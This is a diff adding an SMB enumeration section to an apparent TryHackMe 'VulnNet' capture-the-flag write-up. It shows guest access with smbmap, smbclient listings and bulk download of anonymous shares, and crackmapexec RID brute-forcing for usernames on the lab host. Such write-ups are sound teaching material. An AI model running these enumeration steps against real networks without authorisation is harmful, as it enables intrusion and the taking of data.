@@ -53,6 +53,7 @@ Based on the opened ports like 53(DNS) and 88(kerberos), we can assume this is a
 
 ## SMB Enum
 
+we can enumerate shares anonymously providing a null password using smbmap
 ```
 ╭── /opt/share/tryhackme/vulnet  master ✘✘✘ ✭  
 ╰────▶ smbmap -H vulnet.thm -u guest -p ''
@@ -67,3 +68,44 @@ Based on the opened ports like 53(DNS) and 88(kerberos), we can assume this is a
         VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
         VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
 ```
+
+There are read-only access to three shares (IPC$, VulnNet-Business-Anonymous, and VulnNet-Enterprise-Anonymous)
+The first share out of the 3 hints us of the possibility to do anonymous user enumeration. We will come to that later. so let's access the last 2 shares and see what contents they have
+
+```
+╭── /opt/share/tryhackme/vulnet/smb_loot  master ✘✘✘
+╰────▶ smbclient //vulnet.thm/VulnNet-Business-Anonymous
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Mar 12 21:46:40 2021
+  ..                                  D        0  Fri Mar 12 21:46:40 2021
+  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021
+  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021
+  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021
+
+
+╭── /opt/share/tryhackme/vulnet/smb_loot  master ✘✘✘ ✭  
+╰────▶ smbclient //vulnet.thm/VulnNet-Enterprise-Anonymous                           
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Mar 12 21:46:40 2021
+  ..                                  D        0  Fri Mar 12 21:46:40 2021
+  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021
+  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021
+  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021
+```
+
+Let's download all the contents onto our local machine
+```
+smb: \> mget *
+```
+
+We get potential usernames and other info from the downloaded files from smb. so let's build our username list. Spoiler alert!!, the usernames in the files were generic and didn't match with those create on the machine
+
+Time to find a way to enumerate usernames on the box. i will be using rid-brute from crackmapexec
+```
+crackmapexec smb vulnet.thm -u robot -p '' --rid-brute | grep  SidTypeUser
+```
+![image](https://user-images.githubusercontent.com/68066436/118685539-3038aa80-b7d1-11eb-91e9-572fcd48794a.png)
